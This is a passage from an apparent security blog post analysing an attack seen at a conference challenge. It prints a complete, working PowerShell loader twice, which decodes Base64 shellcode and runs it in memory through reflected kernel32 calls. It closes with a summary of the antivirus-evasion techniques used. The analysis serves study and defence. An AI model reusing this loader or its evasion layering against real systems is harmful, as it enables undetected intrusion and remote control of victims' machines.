style=color:#032f62;--shiki-dark:#9ECBFF>'InMemoryModule'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $false</span><span style=color:#24292e;--shiki-dark:#E1E4E8>).DefineType(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'MyDelegateType'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#032f62;--shiki-dark:#9ECBFF> 'Class, Public, Sealed, AnsiClass, AutoClass'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.MulticastDelegate</span><span style=color:#24292e;--shiki-dark:#E1E4E8>])</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf.DefineConstructor(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'RTSpecialName, HideBySig, Public'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Reflection.CallingConventions</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Standard</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $cpn5o).SetImplementationFlags(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Runtime, Managed'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $aGf.DefineMethod(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Invoke'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#032f62;--shiki-dark:#9ECBFF> 'Public, HideBySig, NewSlot, Virtual'</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $ycb</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $cpn5o).SetImplementationFlags(</span><span style=color:#032f62;--shiki-dark:#9ECBFF>'Runtime, Managed'</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>        return</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $aGf.CreateType()</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$evasionpayload </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/"</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$evasionpayload </span><span style=color:#d73a49;--shiki-dark:#F97583>+=</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//"</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$evasionpayload </span><span style=color:#d73a49;--shiki-dark:#F97583>+=</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q=="</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>Byte</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[]]$sSYI </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Convert</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::FromBase64String($evasionpayload)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>Uint32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$f21aS </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$dQUM </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $sSYI.Length</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0x3000</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0x04</span><span style=color:#24292e;--shiki-dark:#E1E4E8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Copy($sSYI</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> $sSYI.length)</span></span>
<span class=line><span style=color:#d73a49;--shiki-dark:#F97583>if</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (([</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UIntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>].MakeByRefType()) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>Bool</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke($dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Uint32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$sSYI.Length</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 0x10</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Ref</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]$f21aS)) </span><span style=color:#d73a49;--shiki-dark:#F97583>-eq</span><span style=color:#005cc5;--shiki-dark:#79B8FF> $true</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) {</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        $asr </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>UInt32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]) ([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>$dQUM</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8>[</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::Zero)</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>        [</span><span style=color:#d73a49;--shiki-dark:#F97583>System.Runtime.InteropServices.Marshal</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject)</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (vXZ </span><span style=color:#d73a49;--shiki-dark:#F97583>@</span><span style=color:#24292e;--shiki-dark:#E1E4E8>([</span><span style=color:#d73a49;--shiki-dark:#F97583>IntPtr</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#24292e;--shiki-dark:#E1E4E8> [</span><span style=color:#d73a49;--shiki-dark:#F97583>Int32</span><span style=color:#24292e;--shiki-dark:#E1E4E8>]))).Invoke($asr</span><span style=color:#d73a49;--shiki-dark:#F97583>,</span><span style=color:#005cc5;--shiki-dark:#79B8FF>0xffffffff</span><span style=color:#24292e;--shiki-dark:#E1E4E8>) </span><span style=color:#d73a49;--shiki-dark:#F97583>|</span><span style=color:#005cc5;--shiki-dark:#79B8FF> Out-Null</span></span>
<span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>}</span></span>
<span class=line></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">powershell</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="function paE {
        Param ($jJ5, $a_TA6)
        $pRE8k = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) }).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)

        return $pRE8k.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pRE8k.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($jJ5)))), $a_TA6))
}

function vXZ {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cpn5o,
                [Parameter(Position = 1)] [Type] $ycb = [Void]
        )

        $aGf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])
        $aGf.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $cpn5o).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)
        $aGf.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $ycb, $cpn5o).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)

        return $aGf.CreateType()
}
$evasionpayload = &#x22;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/&#x22;
$evasionpayload += &#x22;4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//&#x22;
$evasionpayload += &#x22;1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&#x22;
[Byte[]]$sSYI = [System.Convert]::FromBase64String($evasionpayload)
[Uint32]$f21aS = 0
$dQUM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc), (vXZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sSYI.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($sSYI, 0, $dQUM, $sSYI.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect), (vXZ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($dQUM, [Uint32]$sSYI.Length, 0x10, [Ref]$f21aS)) -eq $true) {
        $asr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread), (vXZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dQUM,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject), (vXZ @([IntPtr], [Int32]))).Invoke($asr,0xffffffff) | Out-Null
}
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><h3 id=conclusion-evasion-strategy>Conclusion: Evasion Strategy<a class=anchor href=#conclusion-evasion-strategy>#</a></h3><p>The PowerShell payload uses a sophisticated, multi-stage strategy to evade detection:</p><ol><li><strong>Initial Obfuscation</strong>: The attack starts with a Base64 encoded command, hiding the initial script from simple static analysis and casual inspection.</li><li><strong>Layered Deobfuscation</strong>: The first-stage script downloads and deobfuscates a second-stage script (using Gzip and Base64 encoding), delaying the exposure of the core malicious logic.</li><li><strong>In-Memory Operations</strong>:<ul><li>Both the second-stage script and the final shellcode are executed entirely in memory. This bypasses AV scanners that primarily focus on detecting malicious files on the disk.</li><li>Dynamic API resolution and in-memory .NET assembly compilation make it harder for AV systems to detect malicious P/Invoke calls through static analysis of import tables.</li></ul></li><li><strong>Shellcode Obfuscation</strong>: Storing the shellcode as a Base64 string (and potentially splitting it across multiple variables) helps to hide it from basic signature-based detection methods.</li></ol><p>These combined techniques significantly improve the payload‚Äôs ability to evade detection by traditional Antivirus solutions.</p></div></article></div><div class="w-full gap-x-10 items-start md:flex mt-8"><div class="flex-1 md:min-w-[50ch] mt-8 text-muted-foreground"><div class="flex flex-col gap-y-2 border px-3 py-2 relative rounded-xl sm:px-4 sm:py-3"><svg class="absolute top-4 end-4 opacity-10 size-20"><use href=/icons/copyright-sponsor.svg#mingcute-copyright-line></use></svg><div class="flex flex-col"><div class="font-medium text-foreground">SinCon Shellshock &amp; C2 Attack Analysis</div><div class=text-sm>https://gr1d-init.github.io/blog/sinconshellshock</div></div><div class="flex flex-wrap flex-row gap-x-5 gap-y-1 justify-start sm:gap-x-8"><div class="flex gap-x-2 sm:flex-col"><span>Author</span> <span class="text-sm max-sm:place-self-center text-foreground">gr1d</span></div><div class="flex gap-x-2 sm:flex-col sm:min-w-16"><span>Published at</span> <span class="text-sm max-sm:place-self-center text-foreground">May 26, 2025</span></div><div class="flex gap-x-2 sm:flex-col"><span>Copyright</span> <a class="text-sm max-sm:place-self-center text-foreground" href=https://creativecommons.org/licenses/by/4.0/ target=_blank>CC BY-NC-SA 4.0</a></div></div></div><div class="mt-3 gap-2 grid grid-cols-1 sm:gap-4 sm:grid-cols-2 sm:mt-6"><div><a class="duration-300 transition-colors border border-transparent flex gap-3 group hover:bg-muted items-center no-underline px-4 py-2 rounded-lg sm:py-4" href=/blog/sinconrfidkampung><svg class="group-hover:stroke-primary stroke-muted-foreground transition-colors rotate-180" fill=none height=20 stroke-linecap=round stroke-linejoin=round stroke-width=2.5 viewBox="0 0 24 24" width=20 xmlns=http://www.w3.org/2000/svg><line class="duration-300 transition-all ease-in-out group-hover:translate-x-1 group-hover:scale-x-100 scale-x-0 translate-x-4" x1=5 x2=19 y1=12 y2=12></line><polyline class="duration-300 transition-all ease-in-out group-hover:translate-x-1 translate-x-0" points="12 5 19 12 12 19"></polyline></svg><div class="flex flex-col gap-0.5 grow max-w-[80%] sm:gap-1.5"><div class="text-sm text-muted-foreground font-normal uppercase">Prev</div><div class="font-medium transition-colors truncate whitespace-nowrap">The SinCon RFID Research Kampung</div></div></a></div><div><a class="duration-300 transition-colors border border-transparent flex gap-3 group hover:bg-muted items-center no-underline px-4 py-2 rounded-lg sm:py-4 justify-end text-right" href=/blog/sincon2025><div class="flex flex-col gap-0.5 grow max-w-[80%] sm:gap-1.5"><div class="text-sm text-muted-foreground font-normal uppercase">Next</div><div class="font-medium transition-colors truncate whitespace-nowrap">My Trip to SinCon2025</div></div><svg class="group-hover:stroke-primary stroke-muted-foreground transition-colors" fill=none height=20 stroke-linecap=round stroke-linejoin=round stroke-width=2.5 viewBox="0 0 24 24" width=20 xmlns=http://www.w3.org/2000/svg><line class="duration-300 transition-all ease-in-out group-hover:translate-x-1 group-hover:scale-x-100 scale-x-0 translate-x-4" x1=5 x2=19 y1=12 y2=12></line><polyline class="duration-300 transition-all ease-in-out group-hover:translate-x-1 translate-x-0" points="12 5 19 12 12 19"></polyline></svg></a></div></div><br></div><div class="basis-60 min-w-40"></div></div><button class="duration-300 text-muted-foreground opacity-0 bg-muted border-2 border-transparent bottom-8 data-[show=true]:opacity-100 data-[show=true]:translate-y-0 end-4 fixed flex group h-10 hover:border-border/75 items-center justify-center rounded-full sm:end-8 sm:h-12 sm:w-12 transition-all translate-y-28 w-10 z-90" id=to-top-btn aria-label="Back to Top" data-show=false><div class="absolute transition-opacity end-0 bottom-0 flex group-[.ended]:opacity-0 group-hover:opacity-0 items-center justify-center start-0 top-0"><span class=text>10</span> <span class=text-xs>%</span></div><svg class="size-6 group-[.ended]:opacity-100 group-hover:opacity-100 opacity-0 transition-opacity"><use href=/icons/ui.svg#mingcute-up-line></use></svg></button><script>!function(){const e="content-header",t=document.getElementById("to-top-btn"),n=t.children[0].children[0],o=document.getElementById(e),c=document.getElementById("content");if(t.addEventListener("click",(()=>{document.documentElement.scrollTo({behavior:"smooth",top:0})})),o){new IntersectionObserver((function(e){e.forEach((e=>{t.dataset.show=(!e.isIntersecting).toString()}))})).observe(o)}else console.error(`Element with ID ${e} not found.`);{const e=c.scrollHeight,o=c.offsetTop,d=document.documentElement.clientHeight;document.addEventListener("scroll",(()=>{const c=function(){const t=document.documentElement.scrollTop||document.body.scrollTop;if(!(t<o))return Math.round((t-o)/(e-d)*100)}();void 0!==c&&(n.innerText=c.toString(),t.classList.toggle("ended",c>100))}))}}()</script></div><footer class="w-full mx-auto mt-24"><div class="border-t border-border pt-5"><div class="flex items-center flex-col sm:flex-row gap-y-3 sm:flex sm:gap-y-0 sm:items-center sm:justify-between"><div class="flex items-center flex-col sm:flex-row gap-2 sm:gap-x-4 text-sm"><div class="[&_a:hover]:text-primary [&_a]:text-foreground text-muted-foreground">¬© 2025 gr1d | Licensed under Apache-2.0</div></div><div class="flex items-center justify-between"><div class="flex items-center gap-x-4"><a class="transition-all text-muted-foreground hover:text-muted-foreground/75 inline-block" href=mailto:gr1d_init@proton.me aria-label=mail rel="noopener noreferrer" target=_blank><svg class=size-6><use href=/icons/social.svg#mingcute-mail-line></use></svg> </a><a class="transition-all text-muted-foreground hover:text-muted-foreground/75 inline-block" href=https://github.com/gr1d-init aria-label=github rel="noopener noreferrer" target=_blank><svg class=size-6><use href=/icons/social.svg#mingcute-github-line></use></svg> </a><a class="transition-all text-muted-foreground hover:text-muted-foreground/75 inline-block" href=https://www.linkedin.com/in/qs220a aria-label=linkedin rel="noopener noreferrer" target=_blank><svg class=size-6><use href=/icons/social.svg#mingcute-linkedin-line></use></svg> </a><a class="transition-all text-muted-foreground hover:text-muted-foreground/75 inline-block" href=/rss.xml aria-label=rss rel="noopener noreferrer" target=_blank><svg class=size-6><use href=/icons/social.svg#mingcute-rss-2-line></use></svg></a></div></div></div></div></footer></main></body></html>